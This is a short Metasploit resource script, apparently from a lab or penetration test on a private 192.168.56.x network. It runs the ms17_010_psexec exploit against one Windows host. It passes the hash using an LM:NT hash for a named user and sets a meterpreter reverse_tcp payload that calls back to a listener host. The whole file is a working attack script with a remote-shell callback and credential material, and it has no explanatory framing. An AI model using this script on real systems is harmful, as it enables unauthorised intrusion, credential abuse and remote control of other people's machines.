use exploit/windows/smb/ms17_010_psexec
sleep 2
set rhosts 192.168.56.123
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.56.188
set smbuser erdong
set smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
set smbdomain WORKGROUP
sleep 2
run
